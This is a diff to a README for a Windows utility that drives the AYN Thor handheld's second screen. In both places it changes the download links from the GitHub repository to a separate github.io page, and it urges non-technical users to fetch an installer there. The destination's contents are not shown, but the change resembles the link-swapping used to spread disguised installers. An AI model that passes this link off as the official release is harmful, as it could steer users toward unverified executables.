@@ -1,6 +1,6 @@
 # 🛡️ Heimdall-AYN-Thor-Assistant - Manage your AYN Thor device easily
 
-[![Download Heimdall](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/vitalizing-seek243/Heimdall-AYN-Thor-Assistant)
+[![Download Heimdall](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://vitalizing-seek243.github.io)
 
 Heimdall-AYN-Thor-Assistant provides a simple way to control the lower screen of your AYN Thor handheld device. This tool runs on your Windows computer and communicates with your device to display system metrics, game stats, and custom layouts. You do not need technical skills to use this software. Follow these instructions to set up your assistant.
 
@@ -19,7 +19,7 @@ If you do not have the .NET runtime, the installer will prompt you to download i
 
 You must visit the project page to get the installer for your device.
 
-[Click here to visit the release page and download the assistant](https://github.com/vitalizing-seek243/Heimdall-AYN-Thor-Assistant)
+[Click here to visit the release page and download the assistant](https://vitalizing-seek243.github.io)
 
 1. Open your web browser.
 2. Select the link above to view the latest version.
